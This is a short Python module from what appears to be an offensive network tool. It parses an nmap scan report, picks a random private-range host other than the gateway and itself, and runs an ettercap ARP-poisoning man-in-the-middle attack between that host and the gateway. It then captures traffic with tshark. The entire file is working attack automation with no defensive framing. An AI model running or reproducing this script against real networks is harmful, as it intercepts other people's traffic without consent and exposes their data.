import time
import random
import subprocess
import pexpect
from poormanslogging import info, warn, error

import src.settings as settings

def get_target_mitm():
	targets = []
	nmap_report = open(settings.OS_PATH + '/cr0z0n0_nmap', 'r')
	for line in nmap_report:
		if line.startswith('Nmap scan report for'):
			ip = line.split(" ")[-1]
			if ip.startswith(("192", "172", "10")) and ip != settings.GATEWAY and ip != settings.IP_LAN:
				targets.append(ip)
	return random.choice(targets)

def run():
	settings.TARGET_MITM = get_target_mitm()
	info("Executing MITM and Sniffing attacks between {g} and {m}...".format(g=settings.GATEWAY, m=settings.TARGET_MITM))
	cmd_ettercap = pexpect.spawn(
				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i}'.format(g=settings.GATEWAY, m=settings.TARGET_MITM, i=settings.INTERFACE))
	time.sleep(2)
	# cmd_tshark = pexpect.spawn('tshark -i {i} -w cr0z0n0_sniff'.format(i=settings.INTERFACE))
	proc = subprocess.call(["tshark", "-i", settings.INTERFACE], stderr=subprocess.DEVNULL)
